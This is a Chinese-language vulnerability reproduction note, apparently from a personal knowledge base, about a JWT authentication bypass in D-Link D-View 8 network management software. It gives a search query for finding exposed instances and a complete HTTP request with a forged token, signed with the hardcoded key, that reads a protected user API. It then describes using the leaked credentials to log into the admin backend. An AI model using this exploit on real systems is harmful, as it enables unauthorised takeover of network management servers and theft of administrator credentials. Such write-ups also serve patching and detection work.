# D-Link D-View 8 JWT认证绕过漏洞

# 一、漏洞简介
D-Link D-View 8是一款高度可定制且易于扩展的网络管理软件，可为任何规模的企业网络基础设施提供端到端的可管理性，支持多厂商设备监控和流量管理，提供实时网络概览和远程位置集中管理等功能。D-Link D-View 8在v2.0.1.28及之前版本中存在硬编码密钥漏洞，由于默认情况下，初始管理员的userId是相同的，未授权攻击者可以利用JWT密钥配合该userId伪造令牌，从而访问受保护的API路由。

# 二、影响版本
+ D-Link D-View 8

# 三、资产测绘
+ hunter`web.title="D-View 8"`
+ 特征

![1701839567675-ed66c07f-aea6-4850-b7c7-c49d862e1d91.png](./img/v1c7cZkWlNWzcNJU/1701839567675-ed66c07f-aea6-4850-b7c7-c49d862e1d91-937841.png)

# 四、漏洞复现
```plain
GET /dview8/api/usersByLevel HTTP/1.1
Host: xx.xx.xx.xx
Authorization: eyJhbGciOiAiSFMyNTYiLCJ0eXAiOiAiand0In0.eyJvcmdJZCI6ICIxMjM0NTY3OC0xMjM0LTEyMzQtMTIzNC0xMjM0NTY3ODA5YWEiLCJ1c2VySWQiOiAiNTkxNzFkNTYtZTZiNC00Nzg5LTkwZmYtYTdhMjdmZDQ4NTQ4IiwidHlwZSI6IDMsImtleSI6ICIxMjM0NTY3OC0xMjM0LTEyMzQtMTIzNC0xMjM0NTY3ODkwYmIiLCJpYXQiOiAxNjg2NzY1MTk4LCJqdGkiOiAiZmRhOGU1YzNlNWY1MTQ5MDMzZThiM2FkNWI3ZDhjMjUiLCJuYmYiOiAxNjg2NzYxNTk4LCJleHAiOiAxODQ0NDQ1MTk4fQ.5swhQdiev4r8ZDNkJAFVkGfRTIaUQlwVue2AI18CrcI
```

![1701839603018-11b6a9b7-e5b8-47e8-81db-8a15049decbd.png](./img/v1c7cZkWlNWzcNJU/1701839603018-11b6a9b7-e5b8-47e8-81db-8a15049decbd-081010.png)

可通过获取的账号密码抓取登录数据包，替换用户名及加密密码后登录后台

![1701839763056-977928a1-6f42-4bd7-b2db-4351ec46a01a.png](./img/v1c7cZkWlNWzcNJU/1701839763056-977928a1-6f42-4bd7-b2db-4351ec46a01a-839628.png)



> 更新: 2024-02-29 23:57:12  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/usw057398ry1de8p>